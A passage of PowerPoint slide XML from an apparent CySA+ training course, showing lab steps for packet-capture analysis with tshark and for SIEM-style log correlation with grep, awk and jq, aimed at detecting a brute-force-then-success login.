        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ tshark -r /tmp/sample.pcap -Y 'tls.handshake.type==1' -T fields -e tls.h</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295</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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1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6 — Hands-On Steps (cont'd)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39293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39293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05840" y="22509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2250948"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="1392936"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Top talkers / conversations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The output ranks IP pairs by bytes.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2205228"/>
            <a:ext cx="3977639" cy="5486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52360" y="2205228"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ tshark -r /tmp/sample.pcap -q -z conv,ip | head -20</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3304032"/>
            <a:ext cx="10634472" cy="139293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304032"/>
            <a:ext cx="91440" cy="139293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005840" y="377190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3771900"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3304032"/>
            <a:ext cx="5486400" cy="1392936"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Apply a display filter while sniffing live</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Display filters (Wireshark-style) are richer than BPF; they can match application-layer fields like http.user_agent or dns.qry.name contains "tor".</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726180"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726180"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ tshark -i any -Y 'dns and ip.dst==8.8.8.8' -c 5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4824984"/>
            <a:ext cx="10634472" cy="139293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4824984"/>
            <a:ext cx="91440" cy="139293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005840" y="5292852"/>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05840" y="5292852"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4824984"/>
            <a:ext cx="5486400" cy="1392936"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 8: Hunt a specific IOC across a pcap</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Imagine your threat-intel feed flags 93.184.216.34:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5247132"/>
            <a:ext cx="3977639" cy="5486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52360" y="5247132"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ tshark -r /tmp/sample.pcap -Y 'ip.addr==93.184.216.34' -T fields -e fram</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296</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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6 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How to capture to a rotating pcap with tcpdump.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How to extract DNS, HTTP, and TLS SNI fields with tshark.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How to rank top talkers and pivot on a specific IOC.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The CySA+ 1.3 muscle memory for any packet-capture exam question.</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297</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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7 — SIEM Log Correlation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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will play the role of a SIEM: ingesting raw logs from multiple sources, normalising them, and correlating fields to detect a brute-force-then-success login pattern. You will use the universal Unix data-pipeline trio — grep, awk, jq — which is enough to prototype any SOAR / SIEM rule before deploying it…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  CySA+ mapping: 1.3 — SIEM, SOAR, Log analysis/correlation.</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298</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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1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7 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Install tools and seed sample logs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y jq</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Extract structured fields with awk (parsing)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Output: timestamp + source IP.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ awk '/Failed password/ {print $1, $(NF-3)}' auth.log</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Count failures per IP (aggregation)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>This is the core SIEM aggregation: 5  203.0.113.7, 1  198.51.100.4.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ grep "Failed password" auth.log | awk '{print $(NF-3)}' | sort | uniq -c</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Correlate failed brute-force with successful login (rule logic)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>If the same IP that produced ≥ 5 failures ever produces an Accepted — that is a confirmed credential-stuffing success.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ bad_ip=$(grep "Failed password" auth.log | awk '{print $(NF-3)}' | sort </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Pivot to a second data source (web logs)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>We now know the attacker authenticated and immediately hit /admin and uploaded a file — likely a web shell.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ grep "$bad_ip" web.log</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299</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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1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7 — Hands-On Steps (cont'd)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21534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1534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05840" y="263118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2631186"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="2153412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Work with structured JSON logs (jq)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Suricata, Zeek, AWS CloudTrail, and most modern tools emit JSON.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2585466"/>
            <a:ext cx="3977639" cy="5486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52360" y="2585466"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ cat &gt; events.json &lt;&lt;'EOF'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4064508"/>
            <a:ext cx="10634472" cy="21534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4064508"/>
            <a:ext cx="91440" cy="21534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005840" y="4912614"/>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4912614"/>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8" name="TextBox 17"/>
